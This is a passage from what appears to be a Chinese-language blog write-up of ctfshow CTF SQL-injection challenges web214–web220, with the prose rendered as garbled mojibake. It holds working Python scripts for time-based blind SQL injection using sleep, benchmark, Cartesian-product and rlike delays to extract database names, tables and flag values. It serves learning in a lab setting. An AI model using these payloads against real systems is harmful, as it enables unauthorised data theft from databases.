class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagx,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagx&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id, flaga, inf</span></span><br><span class="line">        payload = <span class="string">&quot;if((ascii(substr((select flaga from ctfshow_flagx),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i, <span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;è¿™ä¸¤ä¸ªæ˜¯å¤„ç†å¼‚å¸¸ç”¨çš„ï¼Œå¦‚æœæ‰§è¡Œsleep(3)äº†è¯ï¼Œé‚£å¯¹tryæ¥è¯´å°±æ˜¯å¼‚å¸¸äº†ï¼Œå› ä¸ºtimeoutè§„å®šçš„æ˜¯2s,å¼‚å¸¸çš„è¯å°±ä¼šæ‰§è¡Œexceptä¸‹çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure><p>ç„¶åè·Ÿç€ä¸Šé¢çš„èµ°å°±èƒ½æ‹¿åˆ°flagäº†ã€‚</p><p>çœ‹äº†è¿™ä¹ˆå¤šè„šæœ¬çš„ç¼–å†™ï¼Œè‡ªå·±ä¹Ÿä¼šå†™ä¸€ç‚¹äº†(è®°å½•ä¸€ä¸‹è¿™ä¸ªæ—¶åˆ»)</p><h2 id="web215"><a href="#web215" class="headerlink" title="web215"></a>web215</h2><p>æºç </p><p><img src="../images/image-20230101175616535.png" alt="image-20230101175616535"></p><p>è¿™é‡Œæç¤ºäº†ç”¨â€™  â€˜   å•å¼•å·ã€‚</p><p>å°±æ˜¯åŒæ ·ç”¨å•å¼•å·ç»™é—­åˆæ³¨é‡Šæ‰å°±è¡Œ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; or xxxxxxxxxx#  ----&gt;è¿™æ ·å°±å¯ä»¥äº†ã€‚</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬å°±æ‹¿ä¸Šä¸€é¢˜çš„è„šæœ¬æ‹¿æ¥ä¿®æ”¹ä¿®æ”¹å°±å¥½äº†ã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://d1e3eb87-f09e-4e69-9811-9765e724a946.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxc,ctfshow_info</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27; or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaa,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27; or if((ascii(substr((select flagaa from ctfshow_flagxc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;è¿™ä¸¤ä¸ªæ˜¯å¤„ç†å¼‚å¸¸ç”¨çš„ï¼Œå¦‚æœæ‰§è¡Œsleep(3)äº†è¯ï¼Œé‚£å¯¹tryæ¥è¯´å°±æ˜¯å¼‚å¸¸äº†ï¼Œå› ä¸ºtimeoutè§„å®šçš„æ˜¯2s,å¼‚å¸¸çš„è¯å°±ä¼šæ‰§è¡Œexceptä¸‹çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure><p><img src="../images/image-20230103185247275.png" alt="image-20230103185247275"></p><p>æ‹¿åˆ°flagäº†ã€‚</p><h2 id="web216"><a href="#web216" class="headerlink" title="web216"></a>web216</h2><p>æºç </p><p><img src="../images/image-20230103190103648.png" alt="image-20230103190103648"></p><p>é¢˜ç›®å¢åŠ äº†ä¸ªbase64ç¼–ç ï¼Œä½†æ˜¯å½±å“ä¸å¤§ï¼Œè¿™æ ·è¿˜æ˜¯å¯ä»¥ç»•è¿‡ï¼ŒæŠ“ä¸ªåŒ…ï¼Œç„¶åè¿›è¡Œä¸‹é¢çš„åˆ†æå°±èƒ½ç»•è¿‡äº†ã€‚</p><p><img src="../images/image-20230103190054969.png" alt="image-20230103190054969"></p><p>ä¿®æ”¹åçš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://18b8abd6-51e2-4fb8-90ce-f2887bc5ab82.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i, ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxcc,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;&#x27;abc&#x27;) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxcc&#x27;),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaac,i</span></span><br><span class="line">        payload = <span class="string">&quot;&#x27;adb&#x27;) or if((ascii(substr((select flagaac from ctfshow_flagxcc),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;è¿™ä¸¤ä¸ªæ˜¯å¤„ç†å¼‚å¸¸ç”¨çš„ï¼Œå¦‚æœæ‰§è¡Œsleep(3)äº†è¯ï¼Œé‚£å¯¹tryæ¥è¯´å°±æ˜¯å¼‚å¸¸äº†ï¼Œå› ä¸ºtimeoutè§„å®šçš„æ˜¯2s,å¼‚å¸¸çš„è¯å°±ä¼šæ‰§è¡Œexceptä¸‹çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="web217"><a href="#web217" class="headerlink" title="web217"></a>web217</h2><p>æºç </p><p><img src="../images/image-20230103192035743.png" alt="image-20230103192035743"></p><p>è¿™é‡Œæ˜¯å§sleepç»™è¿‡æ»¤æ‰äº†ã€‚é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥ç”¨åˆ«çš„å‡½æ•°æ¥æ›¿ä»£sleepäº†ã€‚</p><p>è¿™é‡Œå°±å¾—ç”¨åˆ°benchmarkå‡½æ•°äº†ã€‚</p><p><img src="../images/image-20230103192546638.png" alt="image-20230103192546638"></p><p>è¿™ä¸ªå‡½æ•°çš„åŠŸèƒ½ benchmark(æ¬¡æ•°ï¼Œå®ç°çš„è®¡ç®—)      </p><p>ä¸Šå›¾çš„æ„æ€å°±æ˜¯è¿›è¡Œäº†100000000æ¬¡md5(1)çš„è®¡ç®—ã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&#x27;http://5d44e38e-dd70-49f9-aa22-472a67c5d0bb.challenge.ctf.show/api/index.php&#x27;</span></span><br><span class="line">flagstr=<span class="string">&quot;&#123;&#125;qwertyuiopasdfghjklzxcvbnm-_,0123456789&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        <span class="comment">#payload = &quot;if((ascii(substr((select database()),&#123;&#125;,1))=&#123;&#125;),sleep(3),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_web</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#ctfshow_flagxccb,ct</span></span><br><span class="line">        <span class="comment">#payload = &quot;999) or if((ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;.format(i,ord(x))</span></span><br><span class="line">        <span class="comment">#id,flagaabc,i</span></span><br><span class="line">        payload = <span class="string">&quot;999) or if((ascii(substr((select flagaabc from ctfshow_flagxccb),&#123;&#125;,1))=&#123;&#125;),benchmark(5000000,md5(1)),1)#&quot;</span>.<span class="built_in">format</span>(i,<span class="built_in">ord</span>(x))</span><br><span class="line">        <span class="built_in">print</span>(payload)</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&quot;ip&quot;</span>:payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>:<span class="number">1</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = requests.post(url = url,data = data,timeout=<span class="number">2</span>)</span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line"></span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;----------------------&quot;</span>+flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#try except  ---&gt;è¿™ä¸¤ä¸ªæ˜¯å¤„ç†å¼‚å¸¸ç”¨çš„ï¼Œå¦‚æœæ‰§è¡Œsleep(3)äº†è¯ï¼Œé‚£å¯¹tryæ¥è¯´å°±æ˜¯å¼‚å¸¸äº†ï¼Œå› ä¸ºtimeoutè§„å®šçš„æ˜¯2s,å¼‚å¸¸çš„è¯å°±ä¼šæ‰§è¡Œexceptä¸‹çš„ä»£ç ã€‚</span></span><br></pre></td></tr></table></figure><h2 id="web218"><a href="#web218" class="headerlink" title="web218"></a>web218</h2><p>æºç </p><p><img src="../images/image-20230103202950013.png" alt="image-20230103202950013"></p><p>è¿™æ¬¡æŠŠsleepå’Œbenchmarkéƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨ç¬›å¡å°”ä¹˜ç§¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ç¬›å¡å°”ç§¯åˆå«ç¬›å¡å°”ä¹˜ç§¯ï¼Œæ˜¯ä¸€ä¸ªå«ç¬›å¡å°”çš„äººæå‡ºæ¥çš„ã€‚</span><br><span class="line">ç®€å•çš„è¯´å°±æ˜¯ä¸¤ä¸ªé›†åˆç›¸ä¹˜çš„ç»“æœã€‚</span><br><span class="line">å…·ä½“çš„å®šä¹‰å»çœ‹çœ‹æœ‰å…³ä»£æ•°ç³»çš„ä¹¦çš„å®šä¹‰ã€‚</span><br><span class="line">ç›´è§‚çš„è¯´å°±æ˜¯</span><br><span class="line">é›†åˆA&#123;a1,a2,a3&#125;</span><br><span class="line">é›†åˆB&#123;b1,b2&#125;</span><br><span class="line">ä»–ä»¬çš„</span><br><span class="line">ç¬›å¡å°”ç§¯</span><br><span class="line">æ˜¯</span><br><span class="line">A*B</span><br><span class="line">=&#123;(a1,b1),(a1,b2),(a2,b1),(a2,b2),(a3,b1),(a3,b2)&#125;</span><br></pre></td></tr></table></figure><p>ç¦»æ•£æ•°å­¦é‡Œä¼šå­¦åˆ°è¿™ä¸ªä¸œè¥¿ã€‚</p><p><img src="../images/image-20230103225712432.png" alt="image-20230103225712432"></p><p><img src="../images/image-20230103230559724.png" alt="image-20230103230559724"></p><p><strong>è¿™å°±æ˜¯mysqlé‡Œçš„ç¬›å¡å°”ä¹˜ç§¯ã€‚</strong></p><p>è¿™é‡Œèƒ½è®©å…¶äº§ç”Ÿå»¶è¿Ÿçš„æ„Ÿè§‰å°±æ˜¯æŸ¥å¤§é‡çš„æ•°æ®çš„æ—¶å€™å°±ä¼šäº§ç”Ÿå»¶è¿Ÿã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1) and if(substr((select database())),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1</span><br></pre></td></tr></table></figure><p>å¯ä»¥ç¬¬ä¸€ä¸ªifåˆ¤æ–­æ”¹æˆ2&gt;1,æ‹¿å»é¢˜ç›®é‚£è¯•ä¸€ä¸‹ï¼Œçœ‹æ˜¯å¦äº§ç”Ÿå»¶è¿Ÿ.</p><p><strong>limit</strong></p><p><img src="../images/image-20230104001113081.png" alt="image-20230104001113081"></p><p><img src="../images/image-20230104001125935.png" alt="image-20230104001125935"></p><p>limit 1,1å°±æ˜¯è¿”å›ç¬¬ä¸€è¡Œçš„æ•°ã€‚<br><img src="../images/image-20230104001335990.png" alt="image-20230104001335990"></p><p>è¿™ä¸ªæ˜¯è¿”å›ç¬¬ä¸€è¡Œåé¢2è¡Œçš„æ•°ã€‚</p><p>è¿˜æœ‰ç­‰ç­‰ç§å¯èƒ½ï¼Œä¸ç†è§£çš„æ—¶å€™å¯ä»¥å»æœ¬åœ°å»è‡ªå·±æŸ¥è¯¢æ¥ç†è§£ã€‚</p><h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><p>æºç </p><p><img src="../images/image-20230104002030913.png" alt="image-20230104002030913"></p><p>æŠŠè¿™ä¸ªä¸œè¥¿ç»™è¿‡æ»¤æ‰äº†ï¼Œè¿™é‡Œå°±å¾—çŸ¥<strong>rlike</strong>ä¹Ÿæ˜¯å¯ä»¥è¿›è¡Œæ—¶é—´ç›²æ³¨çš„ã€‚</p><p>è¿™é‡Œå°±è¦äº”ç§æ–¹æ³•æ¥è¿›è¡Œæ—¶é—´ç›²æ³¨ï¼Œ<strong>sleep</strong>  <strong>benchmark</strong> <strong>rlike</strong>  <strong>ç¬›å¡å°”ä¹˜ç§¯</strong> è¿˜æœ‰ä¸€ç§æ˜¯<strong>åŒé“¾æ¥</strong></p><p>åŒé“¾æ¥æ˜¯å•¥æˆ‘ä¹Ÿä¸å¤ªæ¸…æ¥šï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥è‡ªå·±å»æŸ¥æŸ¥ã€‚</p><p><strong>rlike</strong></p><p>å°±æ˜¯åˆ©ç”¨æ­£åˆ™è¡¨è¾¾å¼æ¥åš.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ­£ä¾§åŒ¹é…åœ¨åŒ¹é…è¾ƒé•¿å­—ç¬¦ä¸²ä½†è‡ªç”±åº¦æ¯”è¾ƒé«˜çš„å­—ç¬¦ä¸²æ—¶ä¼šé€ æˆæ¯”è¾ƒå¤§çš„è®¡ç®—é‡ï¼Œæˆ‘ä»¬é€šè¿‡rpadæˆ–repeatæ„é€ é•¿å­—ç¬¦ä¸²ï¼ŒåŠ ä»¥è®¡ç®—é‡å¤§çš„pattern,é€šè¿‡æ§åˆ¶å­—ç¬¦ä¸²é•¿åº¦æˆ‘ä»¬å¯ä»¥æ§åˆ¶å»¶æ—¶</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT if(1=1,(select rpad(&#x27;a&#x27;,4999999,&#x27;a&#x27;) RLIKE concat(repeat(&#x27;(a.*)+&#x27;,30),&#x27;b&#x27;)),0)</span><br></pre></td></tr></table></figure><p>è¿™é‡Œç”¨ä¸Šä¸€é“é¢˜çš„è„šæœ¬å°±è¡Œäº†ã€‚</p><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Author:Y4tacker</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://45f61877-517c-463b-adae-cc648e4d6531.challenge.ctf.show/api/index.php&quot;</span></span><br><span class="line"></span><br><span class="line">strr = <span class="string">&quot;1234567890&#123;&#125;-qazwsxedcrfvtgbyhnujmikolp&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select table_name from information_schema.tables where table_schema=database() limit 0,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxc&#x27; limit 1,1&quot;</span></span><br><span class="line"><span class="comment"># payload = &quot;select flagaac from ctfshow_flagxc&quot;</span></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> strr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,(select count(*) from ((select table_name from information_schema.columns)a,(select table_name from information_schema.columns)b,(select table_name from information_schema.columns limit 1,7)c) limit 1),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;-----------------------&quot;</span>+res)</span><br><span class="line">            j+=<span class="number">1</span></span><br><span class="line">          </span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><p>æºç </p><p><img src="../images/image-20230104003951518.png" alt="image-20230104003951518"></p><p>æŠŠsubstrç»™ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»ä½¿ç”¨åˆ«çš„å‡½æ•°äº†ï¼Œleft,rightè¿™äº›éƒ½å¯ä»¥ã€‚</p><p>è„šæœ¬</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åé¢çš„sqlé¢˜æ‰¾ä¸ªæœºä¼šå†å»åšï¼Œå…ˆåšåˆ°è¿™äº†"><a href="#åé¢çš„sqlé¢˜æ‰¾ä¸ªæœºä¼šå†å»åšï¼Œå…ˆåšåˆ°è¿™äº†" class="headerlink" title="åé¢çš„sqlé¢˜æ‰¾ä¸ªæœºä¼šå†å»åšï¼Œå…ˆåšåˆ°è¿™äº†"></a>åé¢çš„sqlé¢˜æ‰¾ä¸ªæœºä¼šå†å»åšï¼Œå…ˆåšåˆ°è¿™äº†</h2>]]></content>
      
      
      
        <tags>
            
